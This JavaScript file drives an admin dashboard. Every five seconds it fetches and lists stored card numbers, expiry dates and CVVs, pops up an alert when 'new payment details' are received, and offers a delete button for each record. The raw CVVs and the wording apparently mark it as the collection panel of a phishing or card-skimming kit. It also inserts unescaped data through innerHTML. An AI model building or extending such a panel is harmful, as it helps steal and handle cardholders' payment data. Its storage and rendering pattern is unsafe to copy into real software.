let previousCount = 0; // Global variable to store previous count

async function fetchPayments() {
    try {
        const response = await fetch("/admin/data");
        const data = await response.json();
        
        let tableBody = document.getElementById("payment-table-body");
        tableBody.innerHTML = ""; // Clear previous data

        data.forEach(payment => {
            let row = `
                <tr>
                    <td>${payment.cardNumber}</td>
                    <td>${payment.expiryDate}</td>
                    <td>${payment.cvv}</td>
                    <td>${new Date(payment.createdAt).toLocaleString()}</td>
                    <td>
                        <button class="delete-btn" data-id="${payment._id}"><i class="ri-delete-bin-line"></i></button>
                    </td>
                </tr>
            `;
            tableBody.innerHTML += row;
        });

        // Check if new payments have been added
        if (data.length > previousCount) {
            Swal.fire({
                icon: "info",
                title: "New Payment Details",
                text: "You have received new payment details!",
                confirmButtonColor: "#3085d6",
                width: "400px",
                didOpen: () => {
                    document.querySelector(".swal2-title").style.fontSize = "16px";
                    document.querySelector(".swal2-html-container").style.fontSize = "14px";
                }
            });
        }

        // Update the stored count
        previousCount = data.length;

        // Attach delete event listeners
        document.querySelectorAll(".delete-btn").forEach(button => {
            button.addEventListener("click", async function () {
                const paymentId = this.getAttribute("data-id");

                const confirmDelete = await Swal.fire({
                    icon: "warning",
                    title: "Are you sure?",
                    text: "This payment detail will be permanently deleted!",
                    showCancelButton: true,
                    confirmButtonColor: "#d33",
                    cancelButtonColor: "#3085d6",
                    confirmButtonText: "Yes, delete it!",
                    width: "400px",
                    didOpen: () => {
                        document.querySelector(".swal2-title").style.fontSize = "16px";
                        document.querySelector(".swal2-html-container").style.fontSize = "14px";
                    }
                });

                if (confirmDelete.isConfirmed) {
                    await deletePayment(paymentId);
                }
            });
        });

    } catch (error) {
        console.error("Error fetching payment data:", error);
    }
}

// Function to delete a payment
async function deletePayment(paymentId) {
    try {
        const response = await fetch(`/admin/delete/${paymentId}`, {
            method: "DELETE"
        });

        if (response.ok) {
            Swal.fire({
                icon: "success",
                title: "Deleted!",
                text: "The payment detail has been successfully deleted.",
                confirmButtonColor: "#28a745",
                width: "400px",
                didOpen: () => {
                    document.querySelector(".swal2-title").style.fontSize = "16px";
                    document.querySelector(".swal2-html-container").style.fontSize = "14px";
                }
            });

            // Small delay to allow the database update before reloading
            setTimeout(fetchPayments, 500);
        } else {
            Swal.fire({
                icon: "error",
                title: "Error!",
                text: "Failed to delete payment detail.",
                confirmButtonColor: "#d33",
                width: "400px"
            });
        }
    } catch (error) {
        console.error("Error deleting payment:", error);
        Swal.fire({
            icon: "error",
            title: "Error!",
            text: "Something went wrong.",
            confirmButtonColor: "#d33",
            width: "400px"
        });
    }
}

// Fetch data on page load
window.onload = fetchPayments;

// Check for new payments every 5 seconds
setInterval(fetchPayments, 5000);
